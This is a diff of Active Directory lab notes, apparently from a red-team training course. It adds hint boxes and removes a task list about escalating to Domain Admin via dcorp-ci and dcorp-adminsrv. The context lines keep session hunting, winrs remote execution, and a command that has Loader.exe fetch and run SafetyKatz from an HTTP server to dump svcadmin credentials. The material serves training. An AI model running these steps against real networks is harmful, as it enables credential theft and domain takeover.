@@ -1,8 +1,3 @@
-1. Identify a machine in the target domain where a Domain Admin session in available.
-2. Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci
-3. Escalate to Domain Admin by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv tackle application allowlist using
-	1. Gasps in Applocker rules
-	2. Disable Applocker by modifying GPO applicable to dcorp-adminsrv
 
 > [!INFO] What we do in this lab
  >1. Identify a machine with a Domain Admin session.
@@ -22,6 +17,12 @@ The lab begins with InviShell and PowerView.
 # 2.  Identify a machine in the target domain where a Domain Admin session in available.
 
 ## Discover privileged user sessions
+
+> [!warning] HINTS
+> We use session enumeration to find promising hosts, not to prove access. 
+> 
+> In BloodHound or session-hunting results, we should look for a path that connects a session-bearing computer to an identity or host we already control, then validate each edge.
+
 
 Load Invoke-SessionHunter:
 ```powershell
@@ -109,6 +110,14 @@ Find-DomainUserLocation
 
 
 ## 5.  Check if `dcorp-ci` has privileges on `dcorp-mgmt`
+
+> [!warning] HINTS
+> This is the decisive lateral-movement check in this path: 
+> - the discovery tool suggests `dcorp-mgmt` while the WinRS result tells us whether the existing `dcorp-ci` context can execute a remote command. 
+> 
+> These facts should never be conflated.
+
+
 We can check using this command:
 - `winrs -r:dcorp-mgmt cmd /c "set computername && set username"`
 	- ![[Pasted image 20261120110627.png]]
@@ -121,6 +130,13 @@ We can check using this command:
 > Stampiamo nome del computer e nome dell'utente per controllare dove siamo e con quale contesto viene eseguito il processo.
 
 ## 6. Stage the loader and examine credential exposure on `dcorp-mgmt`.
+
+> [!warning] HINTS
+> We should keep track of where each command runs: the student workstation, `dcorp-ci`, and `dcorp-mgmt` are three different execution contexts. 
+> 
+> Paths such as `C:\Users\Public` refer to the machine on which the command executes.
+
+
 ### 6.1 Place `Loader.exe` and `SafetyKatz.exe` on the HFS server
 First, we require these files to be available on the HFS HTTP server at `172.16.100.55`:
 - `Loader.exe` — the executable that we use to launch another program.
@@ -209,9 +225,16 @@ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.
 
 ****
 ## 7. Interpret the `svcadmin` authentication material
+
+> [!warning] HINTS
+> We should identify the exact credential type before interpreting the output. 
+> 
+> A plaintext password, NTLM hash, Kerberos AES key, and ticket have different roles; an encryption-type label should not be silently reinterpreted.
+
 Now we have seen we have a service run from `svcadmin` in admin mode.
 We have from `SafetyKatz.exe` the password in clear text and also the `aes256_hash` credetials.
 Also if it called ` des_cbc_md4`:
+
 ```text
 dcorp\svcadmin
 ```
@@ -316,6 +339,12 @@ That means we must distinguish three concepts:
 
 
 ## 9. Validate access to the Domain Controller (`dcorp-dc`)
+
+> [!warning] HINTS
+> Successful remote command execution shows that the target accepted an authentication and authorization context. 
+> 
+> It does not, on its own, prove membership in the Domain Admins group.
+
 After obtaining the network authentication context described in the previous step, we can test remote command execution against the Domain Controller.
 ### 9.1 Test a remote command on `dcorp-dc`
 We can test it with:
